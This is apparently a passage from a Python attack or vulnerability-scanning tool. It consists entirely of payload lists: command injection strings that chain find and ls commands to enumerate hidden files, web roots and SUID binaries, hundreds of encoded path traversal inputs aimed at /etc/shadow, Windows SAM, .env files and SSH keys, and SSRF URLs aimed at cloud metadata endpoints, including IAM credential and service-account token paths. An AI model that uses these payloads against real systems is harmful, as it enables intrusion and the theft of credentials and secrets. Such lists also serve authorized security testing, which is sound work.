            "&&find / -name '.gitignore' -type f&&",
            "&&find / -name '.gitconfig' -type f&&",
            "&&find / -name '.gitattributes' -type f&&",
            "&&find / -name '*.git' -type f&&",
            

            ";find / -name '.*' -type f",
            ";find / -name '.*' -type d",
            ";find / -name '.??*' -type f",
            ";find / -name '.??*' -type d",
            ";ls -la ~",
            ";ls -la /",
            
            "|find / -name '.*' -type f",
            "|find / -name '.*' -type d",
            "|find / -name '.??*' -type f",
            "|find / -name '.??*' -type d",
            "|ls -la ~",
            "|ls -la /",
            
            "`find / -name '.*' -type f`",
            "`find / -name '.*' -type d`",
            "`find / -name '.??*' -type f`",
            "`find / -name '.??*' -type d`",
            "`ls -la ~`",
            "`ls -la /`",
            
            "$(find / -name '.*' -type f)",
            "$(find / -name '.*' -type d)",
            "$(find / -name '.??*' -type f)",
            "$(find / -name '.??*' -type d)",
            "$(ls -la ~)",
            "$(ls -la /)",
            
            "||find / -name '.*' -type f||",
            "||find / -name '.*' -type d||",
            "||find / -name '.??*' -type f||",
            "||find / -name '.??*' -type d||",
            "||ls -la ~||",
            "||ls -la /||",
            
            "&&find / -name '.*' -type f&&",
            "&&find / -name '.*' -type d&&",
            "&&find / -name '.??*' -type f&&",
            "&&find / -name '.??*' -type d&&",
            "&&ls -la ~&&",
            "&&ls -la /&&",
            

            ";find /var/www -type f",
            ";find /usr/local/www -type f",
            ";find /srv/www -type f",
            ";find /home/*/public_html -type f",
            ";find /home/*/www -type f",
            ";find /opt/lampp/htdocs -type f",
            
            "|find /var/www -type f",
            "|find /usr/local/www -type f",
            "|find /srv/www -type f",
            "|find /home/*/public_html -type f",
            "|find /home/*/www -type f",
            "|find /opt/lampp/htdocs -type f",
            
            "`find /var/www -type f`",
            "`find /usr/local/www -type f`",
            "`find /srv/www -type f`",
            "`find /home/*/public_html -type f`",
            "`find /home/*/www -type f`",
            "`find /opt/lampp/htdocs -type f`",
            
            "$(find /var/www -type f)",
            "$(find /usr/local/www -type f)",
            "$(find /srv/www -type f)",
            "$(find /home/*/public_html -type f)",
            "$(find /home/*/www -type f)",
            "$(find /opt/lampp/htdocs -type f)",
            
            "||find /var/www -type f||",
            "||find /usr/local/www -type f||",
            "||find /srv/www -type f||",
            "||find /home/*/public_html -type f||",
            "||find /home/*/www -type f||",
            "||find /opt/lampp/htdocs -type f||",
            
            "&&find /var/www -type f&&",
            "&&find /usr/local/www -type f&&",
            "&&find /srv/www -type f&&",
            "&&find /home/*/public_html -type f&&",
            "&&find /home/*/www -type f&&",
            "&&find /opt/lampp/htdocs -type f&&",
            

            ";find / -type f -exec file {} \\; | grep -i 'elf'",
            ";find / -type f -exec file {} \\; | grep -i 'script'",
            ";find / -type f -exec file {} \\; | grep -i 'text'",
            ";find / -type f -exec file {} \\; | grep -i 'binary'",
            ";find / -type f -perm -4000 -exec ls -la {} \\; 2>/dev/null",
            ";find / -type f -perm -2000 -exec ls -la {} \\; 2>/dev/null",
            
            "|find / -type f -exec file {} \\; | grep -i 'elf'",
            "|find / -type f -exec file {} \\; | grep -i 'script'",
            "|find / -type f -exec file {} \\; | grep -i 'text'",
            "|find / -type f -exec file {} \\; | grep -i 'binary'",
            "|find / -type f -perm -4000 -exec ls -la {} \\; 2>/dev/null",
            "|find / -type f -perm -2000 -exec ls -la {} \\; 2>/dev/null",
            
            "`find / -type f -exec file {} \\; | grep -i 'elf'`",
            "`find / -type f -exec file {} \\; | grep -i 'script'`",
            "`find / -type f -exec file {} \\; | grep -i 'text'`",
            "`find / -type f -exec file {} \\; | grep -i 'binary'`",
            "`find / -type f -perm -4000 -exec ls -la {} \\; 2>/dev/null`",
            "`find / -type f -perm -2000 -exec ls -la {} \\; 2>/dev/null`",
            
            "$(find / -type f -exec file {} \\; | grep -i 'elf')",
            "$(find / -type f -exec file {} \\; | grep -i 'script')",
            "$(find / -type f -exec file {} \\; | grep -i 'text')",
            "$(find / -type f -exec file {} \\; | grep -i 'binary')",
            "$(find / -type f -perm -4000 -exec ls -la {} \\; 2>/dev/null)",
            "$(find / -type f -perm -2000 -exec ls -la {} \\; 2>/dev/null)",
            
            "||find / -type f -exec file {} \\; | grep -i 'elf'||",
            "||find / -type f -exec file {} \\; | grep -i 'script'||",
            "||find / -type f -exec file {} \\; | grep -i 'text'||",
            "||find / -type f -exec file {} \\; | grep -i 'binary'||",
            "||find / -type f -perm -4000 -exec ls -la {} \\; 2>/dev/null||",
            "||find / -type f -perm -2000 -exec ls -la {} \\; 2>/dev/null||",
            
            "&&find / -type f -exec file {} \\; | grep -i 'elf'&&",
            "&&find / -type f -exec file {} \\; | grep -i 'script'&&",
            "&&find / -type f -exec file {} \\; | grep -i 'text'&&",
            "&&find / -type f -exec file {} \\; | grep -i 'binary'&&",
            "&&find / -type f -perm -4000 -exec ls -la {} \\; 2>/dev/null&&",
            "&&find / -type f -perm -2000 -exec ls -la {} \\; 2>/dev/null&&"
        ]

        
        self.path_traversal_payloads = [

            "../../../etc/passwd",
            "../../../etc/shadow",
            "../../../etc/hosts",
            "../../../etc/hostname",
            "../../../etc/group",
            "../../../etc/nginx/nginx.conf",
            "../../../etc/apache2/apache2.conf",
            "../../../etc/httpd/conf/httpd.conf",
            

            "..\\..\\..\\windows\\win.ini",
            "..\\..\\..\\windows\\system.ini",
            "..\\..\\..\\boot.ini",
            "..\\..\\..\\windows\\repair\\SAM",
            "..\\..\\..\\windows\\System32\\config\\SAM",
            "..\\..\\..\\windows\\System32\\drivers\\etc\\hosts",
            

            "....//....//....//etc/passwd",
            "....//....//....//etc/shadow",
            "....//....//....//windows/win.ini",
            "....//....//....//windows/system.ini",
            

            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fshadow",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fwindows%2fwin.ini",
            "%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5cwin.ini",
            

            "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd",
            "%252e%252e%255c%252e%252e%255c%252e%252e%255cwindows%255cwin.ini",
            "..%252f..%252f..%252fetc%252fpasswd",
            "..%255c..%255c..%255cwindows%255cwin.ini",
            

            "%2525252e%2525252e%2525252f%2525252e%2525252e%2525252f%2525252e%2525252e%2525252fetc%2525252fpasswd",
            

            "%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002fetc%u002fpasswd",
            "%u002e%u002e%u005c%u002e%u002e%u005c%u002e%u002e%u005cwindows%u005cwin.ini",
            "..%u2215..%u2215..%u2215etc%u2215passwd",
            "..%u2216..%u2216..%u2216windows%u2216win.ini",
            

            "%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%afetc%c0%afpasswd",
            "%c0%ae%c0%ae%c0%ae%c0%ae%c0%ae%c0%aeetc%c0%afpasswd",
            "..%c0%af..%c0%af..%c0%afetc/passwd",
            "..%c1%9c..%c1%9c..%c1%9cwindows/win.ini",
            

            "../../../etc/passwd%00",
            "../../../etc/passwd%00.jpg",
            "../../../etc/passwd%00.txt",
            "../../../etc/passwd%00.png",
            "..\\..\\..\\windows\\win.ini%00",
            "..\\..\\..\\windows\\win.ini%00.txt",
            

            "../../../etc/passwd%2500",
            "../../../etc/passwd%2500.jpg",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%2500",
            

            "../../../etc/passwd.jpg",
            "../../../etc/passwd.png",
            "../../../etc/passwd.txt",
            "../../../etc/passwd.pdf",
            "..\\..\\..\\windows\\win.ini.jpg",
            "..\\..\\..\\windows\\win.ini.png",
            

            "..\\..\\../etc/passwd",
            "../..\\..\\etc/passwd",
            "..\\../..\\etc/passwd",
            "../../..\\etc/passwd",
            "..\\..\\..\\windows/win.ini",
            "../..\\..\\windows/win.ini",
            

            "..%5c..%2f..%5cetc%2fpasswd",
            "..%2f..%5c..%2fetc%5cpasswd",
            "%2e%2e%5c%2e%2e%2f%2e%2e%5cetc%2fpasswd",
            

            "/etc/passwd",
            "/etc/shadow",
            "/etc/hosts",
            "/etc/nginx/nginx.conf",
            "/var/log/auth.log",
            "/var/log/syslog",
            "/proc/self/environ",
            "/proc/self/cmdline",
            "/proc/version",
            

            "C:\\windows\\win.ini",
            "C:\\windows\\system.ini",
            "C:\\boot.ini",
            "C:\\windows\\System32\\config\\SAM",
            "C:\\windows\\repair\\SAM",
            "C:\\windows\\System32\\drivers\\etc\\hosts",
            

            "\\\\localhost\\c$\\windows\\win.ini",
            "\\\\127.0.0.1\\c$\\windows\\win.ini",
            "\\\\localhost\\admin$\\system32\\config\\SAM",
            "\\\\127.0.0.1\\admin$\\system32\\config\\SAM",
            

            "../../../../../../../../etc/passwd",
            "../../../../../../../../etc/shadow",
            "../../../../../../../../windows/win.ini",
            "../../../../../../../../windows/system.ini",
            "../../../../../../../../../etc/passwd",
            

            "....\\....\\....\\windows\\win.ini",
            "....\\....\\....\\windows\\system.ini",
            "....\\....\\....\\boot.ini",
            

            ".../.../.../etc/passwd",
            "..../..../..../etc/passwd",
            "...../...../...../etc/passwd",
            "...\\...\\...\\windows\\win.ini",
            

            "%2e%2e%2e%2f%2e%2e%2e%2f%2e%2e%2e%2fetc%2fpasswd",
            "%2e%2e%2e%2e%2f%2e%2e%2e%2e%2f%2e%2e%2e%2e%2fetc%2fpasswd",
            

            "./.././.././../etc/passwd",
            ".\\..\\.\\..\\.\\..\\windows\\win.ini",
            "./../.././../etc/passwd",
            

            "%2e%2f%2e%2e%2f%2e%2f%2e%2e%2f%2e%2f%2e%2e%2fetc%2fpasswd",
            "%2e%5c%2e%2e%5c%2e%5c%2e%2e%5c%2e%5c%2e%2e%5cwindows%5cwin.ini",
            

            ".. /.. /.. /etc/passwd",
            "..\\ ..\\ ..\\ windows\\win.ini",
            "%2e%2e%20%2f%2e%2e%20%2f%2e%2e%20%2fetc%2fpasswd",
            

            "..\t/..\t/..\t/etc/passwd",
            "..\t\\..\t\\..\t\\windows\\win.ini",
            "%2e%2e%09%2f%2e%2e%09%2f%2e%2e%09%2fetc%2fpasswd",
            

            "..\n/..\n/..\n/etc/passwd",
            "..\n\\..\n\\..\n\\windows\\win.ini",
            "%2e%2e%0a%2f%2e%2e%0a%2f%2e%2e%0a%2fetc%2fpasswd",
            

            "..\r/..\r/..\r/etc/passwd",
            "..\r\\..\r\\..\r\\windows\\win.ini",
            "%2e%2e%0d%2f%2e%2e%0d%2f%2e%2e%0d%2fetc%2fpasswd",
            

            "..\v/..\v/..\v/etc/passwd",
            "..\v\\..\v\\..\v\\windows\\win.ini",
            "%2e%2e%0b%2f%2e%2e%0b%2f%2e%2e%0b%2fetc%2fpasswd",
            

            "..\f/..\f/..\f/etc/passwd",
            "..\f\\..\f\\..\f\\windows\\win.ini",
            "%2e%2e%0c%2f%2e%2e%0c%2f%2e%2e%0c%2fetc%2fpasswd",
            

            "..%2f..%2f..%2fetc%2fpasswd%3f",
            "..%2f..%2f..%2fetc%2fpasswd%23",
            "..%2f..%2f..%2fetc%2fpasswd%26",
            

            "..%252f..%252f..%252fetc%252fpasswd%253f",
            "..%252f..%252f..%252fetc%252fpasswd%2523",
            

            "../../../etc/passwd.php",
            "../../../etc/passwd.html",
            "../../../etc/passwd.css",
            "../../../etc/passwd.js",
            "../../../etc/passwd.xml",
            

            "..\\..\\..\\windows\\win.ini.php",
            "..\\..\\..\\windows\\win.ini.html",
            "..\\..\\..\\windows\\win.ini.css",
            "..\\..\\..\\windows\\System32\\config\\SAM.xml",
            

            "php://filter/convert.base64-encode/resource=../../../etc/passwd",
            "php://filter/read=convert.base64-encode/resource=../../../etc/passwd",
            "expect://ls",
            "data://text/plain;base64,PDw8PDw8PDw=",
            

            "zip://../../../etc/passwd#test",
            "compress.zlib://../../../etc/passwd",
            "compress.bzip2://../../../etc/passwd",
            

            "file:///etc/passwd",
            "file:///c:/windows/win.ini",
            "file://localhost/etc/passwd",
            "file://127.0.0.1/c$/windows/win.ini",
            

            "http://localhost/etc/passwd",
            "http://127.0.0.1/c$/windows/win.ini",
            

            "ftp://anonymous:anonymous@localhost/etc/passwd",
            "ftp://anonymous:anonymous@127.0.0.1/c$/windows/win.ini",
            

            "ssh2.shell://user:pass@localhost/etc/passwd",
            "ssh2.exec://user:pass@localhost/etc/passwd",
            

            "glob://../../../etc/passwd",
            "glob://../../..\\windows\\win.ini",
            

            "phar://../../../etc/passwd",
            "phar://../../..\\windows\\win.ini",
            

            "zlib://../../../etc/passwd",
            "zlib://../../..\\windows\\win.ini",
            

            "bzip2://../../../etc/passwd",
            "bzip2://../../..\\windows\\win.ini",
            

            "rar://../../../etc/passwd",
            "rar://../../..\\windows\\win.ini",
            

            "gz://../../../etc/passwd",
            "gz://../../..\\windows\\win.ini",
            

            "deflate://../../../etc/passwd",
            "deflate://../../..\\windows\\win.ini",
            

            "mcrypt://../../../etc/passwd",
            "mcrypt://../../..\\windows\\win.ini",
            

            "mdecrypt://../../../etc/passwd",
            "mdecrypt://../../..\\windows\\win.ini",
            

            "../../../WEB-INF/web.xml",
            "../../../WEB-INF/classes/application.properties",
            "../../../config/config.php",
            "../../../.env",
            "../../../wp-config.php",
            "../../../database.yml",
            "../../../settings.py",
            "../../../application.ini",
            

            "../../../WEB-INF/classes/com/example/config.properties",
            "../../../META-INF/context.xml",
            "../../../META-INF/MANIFEST.MF",
            

            "../../../web.config",
            "../../../app.config",
            "../../../connectionStrings.config",
            "../../../machine.config",
            

            "../../../config/database.yml",
            "../../../config/secrets.yml",
            "../../../config/credentials.yml.enc",
            

            "../../../settings.py",
            "../../../local_settings.py",
            "../../../config/settings.py",
            

            "../../../package.json",
            "../../../.env",
            "../../../config.json",
            "../../../app/config.json",
            

            "../../../var/log/apache2/access.log",
            "../../../var/log/apache2/error.log",
            "../../../var/log/nginx/access.log",
            "../../../var/log/nginx/error.log",
            "../../../var/log/syslog",
            "../../../var/log/auth.log",
            "../../../var/log/messages",
            

            "../../../var/lib/php/sessions/sess_123456",
            "../../../tmp/sess_123456",
            "../../../var/lib/php5/sess_123456",
            

            "../../../backup.zip",
            "../../../backup.tar",
            "../../../backup.sql",
            "../../../database.sql",
            "../../../dump.sql",
            

            "../../../index.php",
            "../../../index.php.bak",
            "../../../index.php.old",
            "../../../index.php.save",
            "../../../app.js",
            "../../../app.js.bak",
            

            "../../../.htaccess",
            "../../../.htpasswd",
            "../../../robots.txt",
            "../../../crossdomain.xml",
            "../../../clientaccesspolicy.xml",
            

            "../../../.git/config",
            "../../../.git/HEAD",
            "../../../.svn/entries",
            "../../../.hg/hgrc",
            "../../../.bzr/branch-format",
            

            "../../../Dockerfile",
            "../../../docker-compose.yml",
            "../../../.dockerignore",
            "../../../kubeconfig.yaml",
            "../../../values.yaml",
            

            "../../../.travis.yml",
            "../../../.gitlab-ci.yml",
            "../../../Jenkinsfile",
            "../../../azure-pipelines.yml",
            

            "../../../.env.local",
            "../../../.env.production",
            "../../../.env.development",
            "../../../.env.test",
            

            "../../../ssl.key",
            "../../../ssl.crt",
            "../../../certificate.pem",
            "../../../private.key",
            "../../../public.key",
            

            "../../../api-keys.json",
            "../../../secrets.json",
            "../../../credentials.json",
            "../../../keys.yaml",
            

            "../../../uploads/users/1/profile.jpg",
            "../../../data/users.csv",
            "../../../exports/user_data.xlsx",
            

            "../../../database.db",
            "../../../app.db",
            "../../../data.sqlite",
            "../../../production.sqlite3",
            

            "../../../tmp/upload.tmp",
            "../../../temp/tempfile.tmp",
            "../../../cache/temp.cache",
            

            "../../../ETC/PASSWD",
            "../../../etc/PASSWD",
            "../../../ETC/passwd",
            "../../../Etc/Passwd",
            "../../../eTc/pAsSwD",
            

            "../../../WINDOWS/WIN.INI",
            "../../../windows/WIN.INI",
            "../../../WINDOWS/win.ini",
            "../../../Windows/Win.ini",
            

            "%2e%2e%2f%2e%2e%2f%2e%2e%2f%45%54%43%2f%50%41%53%53%57%44",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64",
            

            "%2E%2E%2F%2E%2E%2F%2E%2E%2F%45%74%43%2F%50%61%53%73%57%64",
            

            "....//....//....//etc/passwd",
            "..//..//..//etc/passwd",
            "..\/..\/..\/etc/passwd",
            "..\\/..\\/..\\/etc/passwd",
            "..\\//..\\//..\\//etc/passwd",
            

            "..%2f%2f..%2f%2f..%2f%2fetc%2fpasswd",
            "..%5c%5c..%5c%5c..%5c%5cwindows%5cwin.ini",
            

            "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd",
            "%252e%252e%255c%252e%252e%255c%252e%252e%255cwindows%255cwin.ini",
            

            "%2525252e%2525252e%2525252f%2525252e%2525252e%2525252f%2525252e%2525252e%2525252fetc%2525252fpasswd",
            

            "..%c0%af..%c0%af..%c0%afetc/passwd",
            "..%e0%80%af..%e0%80%af..%e0%80%afetc/passwd",
            "..%f0%80%80%af..%f0%80%80%af..%f0%80%80%afetc/passwd",
            

            "\\\\?\\C:\\windows\\win.ini",
            "\\\\.\\C:\\windows\\win.ini",
            "\\\\localhost\\C$\\windows\\win.ini",
            "\\\\127.0.0.1\\C$\\windows\\win.ini",
            

            "../../../etc/passwd::$DATA",
            "..\\..\\..\\windows\\win.ini::$DATA",
            "../../../etc/passwd:passwd.txt",
            "..\\..\\..\\windows\\win.ini:win.txt",
            

            "CON",
            "PRN",
            "AUX",
            "NUL",
            "COM1",
            "COM2",
            "LPT1",
            "LPT2",
            

            "CON.txt",
            "PRN.jpg",
            "AUX.png",
            "NUL.pdf",
            

            "*",
            "?",
            "../../../etc/pass*",
            "..\\..\\..\\windows\\win.*",
            

            "%WINDIR%\\win.ini",
            "%SYSTEMROOT%\\system.ini",
            "%USERPROFILE%\\ntuser.dat",
            "%APPDATA%\\Microsoft\\Windows\\Recent",
            

            "$HOME/.bash_history",
            "$HOME/.ssh/id_rsa",
            "$HOME/.ssh/authorized_keys",
            "/home/$USER/.bashrc",
            

            "../../../etc/passwd" + "A" * 100,
            "../../../etc/passwd" + " " * 100,
            "../../../etc/passwd" + "\t" * 100,
            "../../../etc/passwd" + "\n" * 100,
            

            "../../../etc/passwd.php.gif",
            "../../../etc/passwd.html.jpg",
            "../../../etc/passwd.png.txt",
            "..\\..\\..\\windows\\win.ini.php.jpg",
            

            "../../../etc/passwd?param=value",
            "../../../etc/passwd#fragment",
            "../../../etc/passwd?",
            "../../../etc/passwd#",
            

            "../../../etc/passwd#test",
            "../../../etc/passwd#",
            "..\\..\\..\\windows\\win.ini#test",
            

            ".../.../.../etc/passwd",
            "..../..../..../etc/passwd",
            "...../...../...../etc/passwd",
            "......\\......\\......\\windows\\win.ini",
            

            "..//..//..//etc/passwd",
            "..///..///..///etc/passwd",
            "..\\//..\\//..\\//etc/passwd",
            "..//\\..//\\..//\\etc/passwd",
            

            "../../../etc/passwd%0a",
            "../../../etc/passwd%0d",
            "../../../etc/passwd%09",
            "../../../etc/passwd%20",
            

            "%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64%00",
            "%2e%2e%5c%2e%2e%5c%2e%2e%5c%77%69%6e%64%6f%77%73%5c%77%69%6e%2e%69%6e%69%00",
            

            "..∕..∕..∕etc∕passwd",
            "..⁄..⁄..⁄etc⁄passwd",
            "..∖..∖..∖windows∖win.ini",
            "..⧵..⧵..⧵windows⧵win.ini",
            

            "．．／．．／．．／ｅｔｃ／ｐａｓｓｗｄ",
            "．．＼．．＼．．＼ｗｉｎｄｏｗｓ＼ｗｉｎ．ｉｎｉ",
            

            "../../../etc/passwd" + "\u200b",
            "../../../etc/passwd" + "\u200c",
            "../../../etc/passwd" + "\u200d",
            "../../../etc/passwd" + "\u2060",
            

            "../../../etc/passwd" + "\u202e",
            "\u202e" + "ini.win\\swodniw\\..\\..\\..",
            

            "../․/../․/../․/etc/passwd",
            "../․․/../․․/../․․/etc/passwd",
            "../…/../…/../…/etc/passwd",
            

            "../∕∕../∕∕../∕∕etc∕passwd",
            "../∖∖../∖∖../∖∖windows∖win.ini",
            

            "../$../$../$/etc/passwd",
            "../€../€../€/etc/passwd",
            "../£../£../£/etc/passwd",
            "../¥../¥../¥/etc/passwd",
            

            "../!../!../!/etc/passwd",
            "../?../?../?/etc/passwd",
            "../@../@../@/etc/passwd",
            "../#../#../#/etc/passwd",
            

            "../[../[../[/etc/passwd",
            "../{../{../{/etc/passwd",
            "../<../<../</etc/passwd",
            

            "/" * 100 + "etc/passwd",
            "\\" * 100 + "windows\\win.ini",
            "C:" + "/" * 100 + "windows/win.ini",
            "/etc/passwd" + "/" * 100,
        ]
        
        self.ssrf_payloads = [

            "http://169.254.169.254/latest/meta-data/",
            "http://169.254.169.254/latest/user-data/",
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin",
            "http://169.254.169.254/latest/meta-data/public-keys/",
            "http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key",
            "http://169.254.169.254/latest/meta-data/placement/availability-zone",
            "http://169.254.169.254/latest/meta-data/instance-id",
            "http://169.254.169.254/latest/dynamic/instance-identity/document",
            "http://169.254.169.254/latest/dynamic/instance-identity/pkcs7",
            

            "http://169.254.169.254/latest/api/token",
            "http://169.254.169.254/latest/meta-data/network/interfaces/macs/",
            "http://169.254.169.254/latest/meta-data/network/interfaces/macs/02:29:96:8f:6a:2d/local-ipv4s",
            "http://169.254.169.254/latest/meta-data/network/interfaces/macs/02:29:96:8f:6a:2d/public-keys/",
            "http://169.254.169.254/latest/meta-data/network/interfaces/macs/02:29:96:8f:6a:2d/security-groups",
            "http://169.254.169.254/latest/meta-data/network/interfaces/macs/02:29:96:8f:6a:2d/subnet-id",
            "http://169.254.169.254/latest/meta-data/network/interfaces/macs/02:29:96:8f:6a:2d/vpc-id",
            "http://169.254.169.254/latest/meta-data/network/interfaces/macs/02:29:96:8f:6a:2d/vpc-ipv4-cidr-block",
            

            "http://metadata.google.internal/computeMetadata/v1/",
            "http://metadata.google.internal/computeMetadata/v1/instance/",
            "http://metadata.google.internal/computeMetadata/v1/instance/id",
            "http://metadata.google.internal/computeMetadata/v1/instance/name",
            "http://metadata.google.internal/computeMetadata/v1/instance/hostname",
            "http://metadata.google.internal/computeMetadata/v1/instance/zone",
            "http://metadata.google.internal/computeMetadata/v1/instance/machine-type",
            "http://metadata.google.internal/computeMetadata/v1/instance/network-interfaces/",
            "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/",
            "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
            

            "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/identity",
            "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email",
            "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes",
            "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/aliases",
            "http://metadata.google.internal/computeMetadata/v1/project/project-id",
            "http://metadata.google.internal/computeMetadata/v1/project/numeric-project-id",
            "http://metadata.google.internal/computeMetadata/v1/instance/attributes/",
            "http://metadata.google.internal/computeMetadata/v1/instance/attributes/ssh-keys",
            "http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env",
            "http://metadata.google.internal/computeMetadata/v1/instance/attributes/cluster-location",
            

            "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
            "http://169.254.169.254/metadata/instance/compute?api-version=2021-02-01",
            "http://169.254.169.254/metadata/instance/network?api-version=2021-02-01",
            "http://169.254.169.254/metadata/instance/compute/azEnvironment?api-version=2021-02-01",
            "http://169.254.169.254/metadata/instance/compute/location?api-version=2021-02-01",
            "http://169.254.169.254/metadata/instance/compute/name?api-version=2021-02-01",
            "http://169.254.169.254/metadata/instance/compute/resourceGroupName?api-version=2021-02-01",
            "http://169.254.169.254/metadata/instance/compute/subscriptionId?api-version=2021-02-01",
            "http://169.254.169.254/metadata/instance/compute/vmId?api-version=2021-02-01",
            "http://169.254.169.254/metadata/instance/compute/vmSize?api-version=2021-02-01",
            

            "http://169.254.169.254/metadata/instance/compute/tags?api-version=2021-02-01",
            "http://169.254.169.254/metadata/instance/compute/tagsList?api-version=2021-02-01",
            "http://169.254.169.254/metadata/instance/compute/placementGroupId?api-version=2021-02-01",
            "http://169.254.169.254/metadata/instance/compute/platformFaultDomain?api-version=2021-02-01",
            "http://169.254.169.254/metadata/instance/compute/platformUpdateDomain?api-version=2021-02-01",
            "http://169.254.169.254/metadata/instance/compute/priority?api-version=2021-02-01",
            "http://169.254.169.254/metadata/instance/compute/vmScaleSetName?api-version=2021-02-01",
            "http://169.254.169.254/metadata/instance/compute/zone?api-version=2021-02-01",
            "http://169.254.169.254/metadata/instance/compute/osType?api-version=2021-02-01",
            "http://169.254.169.254/metadata/instance/compute/licenseType?api-version=2021-02-01",
            

            "http://169.254.169.254/metadata/v1/",
            "http://169.254.169.254/metadata/v1/id",
            "http://169.254.169.254/metadata/v1/hostname",
            "http://169.254.169.254/metadata/v1/region",
            "http://169.254.169.254/metadata/v1/public-keys",
            "http://169.254.169.254/metadata/v1/user-data",
            "http://169.254.169.254/metadata/v1/vendor-data",
            "http://169.254.169.254/metadata/v1/interfaces/",
            "http://169.254.169.254/metadata/v1/interfaces/public/",
            "http://169.254.169.254/metadata/v1/interfaces/public/0/",
            

            "http://169.254.169.254/metadata/v1.json",
            "http://169.254.169.254/metadata/v1/user-data",
            "http://169.254.169.254/metadata/v1/vendor-data",
            "http://169.254.169.254/metadata/v1/dns",
            "http://169.254.169.254/metadata/v1/ssh_keys",
            "http://169.254.169.254/metadata/v1/tags",
            "http://169.254.169.254/metadata/v1/features",
            "http://169.254.169.254/metadata/v1/volumes",
            "http://169.254.169.254/metadata/v1/floating_ip",
            "http://169.254.169.254/metadata/v1/reserved_ip",
            

            "http://169.254.169.254/opc/v1/",
            "http://169.254.169.254/opc/v1/instance/",
            "http://169.254.169.254/opc/v1/instance/id",
            "http://169.254.169.254/opc/v1/instance/region",
            "http://169.254.169.254/opc/v1/instance/shape",
            "http://169.254.169.254/opc/v1/instance/ociAdName",
            "http://169.254.169.254/opc/v1/instance/metadata/",
            "http://169.254.169.254/opc/v1/instance/metadata/ssh_authorized_keys",
            "http://169.254.169.254/opc/v1/instance/metadata/user_data",
            "http://169.254.169.254/opc/v1/vnics/",
            

            "http://169.254.169.254/opc/v2/",
            "http://169.254.169.254/opc/v2/instance/",
            "http://169.254.169.254/opc/v2/instance/id",
            "http://169.254.169.254/opc/v2/instance/region",
            "http://169.254.169.254/opc/v2/instance/shape",
            "http://169.254.169.254/opc/v2/instance/ociAdName",
            "http://169.254.169.254/opc/v2/instance/metadata/",
            "http://169.254.169.254/opc/v2/instance/metadata/ssh_authorized_keys",
            "http://169.254.169.254/opc/v2/instance/metadata/user_data",
            "http://169.254.169.254/opc/v2/vnics/",
            

            "http://100.100.100.200/latest/meta-data/",
            "http://100.100.100.200/latest/meta-data/instance-id",
            "http://100.100.100.200/latest/meta-data/instance-type",
            "http://100.100.100.200/latest/meta-data/region-id",
            "http://100.100.100.200/latest/meta-data/zone-id",
            "http://100.100.100.200/latest/meta-data/private-ipv4",
            "http://100.100.100.200/latest/meta-data/eipv4",
            "http://100.100.100.200/latest/meta-data/image-id",
            "http://100.100.100.200/latest/meta-data/serial-number",
            "http://100.100.100.200/latest/meta-data/ram/security-credentials/",
            

            "http://100.100.100.200/latest/meta-data/ram/security-credentials/EcsRamRoleTest",
            "http://100.100.100.200/latest/meta-data/ram/security-credentials/EcsRamRoleDocument",
            "http://100.100.100.200/latest/meta-data/ram/security-credentials/EcsRamRoleOss",
            "http://100.100.100.200/latest/meta-data/ram/security-credentials/EcsRamRoleRds",
            "http://100.100.100.200/latest/meta-data/ram/security-credentials/EcsRamRoleSlb",
            "http://100.100.100.200/latest/meta-data/ram/security-credentials/EcsRamRoleVpc",
            "http://100.100.100.200/latest/meta-data/ram/security-credentials/EcsRamRoleNas",
            "http://100.100.100.200/latest/meta-data/ram/security-credentials/EcsRamRoleRedis",
            "http://100.100.100.200/latest/meta-data/ram/security-credentials/EcsRamRoleMongodb",
            "http://100.100.100.200/latest/meta-data/ram/security-credentials/EcsRamRoleKafka",
            

            "http://localhost",
            "http://127.0.0.1",
            "http://0.0.0.0",
            "http://[::1]",
            "http://[::]",
            "http://127.0.0.1:22",
            "http://127.0.0.1:80",
            "http://127.0.0.1:443",
            "http://127.0.0.1:3306",
            "http://127.0.0.1:5432",
            

            "http://localhost:22",
            "http://localhost:80",
            "http://localhost:443",
            "http://localhost:3306",
            "http://localhost:5432",
            "http://localhost:6379",
            "http://localhost:27017",
            "http://localhost:9200",
            "http://localhost:11211",
            "http://localhost:5984",
            

            "http://[::]:22",
            "http://[::1]:22",
            "http://[::ffff:127.0.0.1]:22",
            "http://[::ffff:0:127.0.0.1]:22",
            "http://[0:0:0:0:0:0:0:1]:22",
            "http://[0:0:0:0:0:0:0:0]:22",
            "http://[fe80::1]:22",
            "http://[fe80::]:22",
            "http://[fc00::]:22",
            "http://[fd00::]:22",
            

            "http://10.0.0.1",
            "http://10.0.0.0",
            "http://10.255.255.255",
            "http://172.16.0.1",
            "http://172.31.255.255",
            "http://192.168.0.1",
            "http://192.168.1.1",
            "http://192.168.255.255",
            "http://169.254.0.1",
            "http://169.254.255.255",
            

            "http://10.0.0.1:22",
            "http://10.0.0.1:80",
            "http://10.0.0.1:443",
            "http://10.0.0.1:3306",
            "http://10.0.0.1:5432",
            "http://172.16.0.1:22",
            "http://172.16.0.1:80",
            "http://172.16.0.1:443",
            "http://172.16.0.1:3306",
            "http://172.16.0.1:5432",
            

            "file:///etc/passwd",
            "file:///etc/shadow",
